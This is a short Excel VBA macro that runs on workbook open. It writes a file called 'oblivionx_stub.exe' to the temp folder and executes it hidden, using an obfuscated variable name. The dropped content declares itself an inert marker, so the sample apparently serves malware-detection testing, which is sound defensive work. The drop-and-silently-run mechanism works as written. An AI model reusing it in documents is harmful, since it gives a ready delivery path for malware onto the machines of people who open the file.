Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim lckhv437 As Integer, exe As String
    exe = Environ("TEMP") & "\oblivionx_stub.exe"
    lckhv437 = FreeFile
    Open exe For Binary As #lckhv437
    Put #lckhv437, , "MZ-this-is-an-inert-marker-stub"
    Close #lckhv437
    Shell exe, 0
End Sub
